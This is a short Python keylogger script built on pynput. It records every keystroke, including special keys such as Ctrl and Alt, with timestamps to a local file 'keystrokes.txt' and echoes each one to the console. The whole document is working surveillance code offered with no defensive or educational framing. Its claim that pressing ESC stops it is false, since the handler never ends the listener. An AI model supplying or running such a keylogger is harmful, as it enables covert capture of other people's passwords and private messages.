from pynput import keyboard
import logging

# Set up logging to write to a file
log_file = 'keystrokes.txt'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_key_press(key):
    try:
        # Log the character pressed
        logging.info(f'Key pressed: {key.char}')
        print(f'Key pressed: {key.char}')  # Print to console
    except AttributeError:
        # Log special keys (like Ctrl, Alt, etc.)
        logging.info(f'Special key pressed: {key}')
        print(f'Special key pressed: {key}')  # Print to console

# Collect events until released
with keyboard.Listener(on_press=on_key_press) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()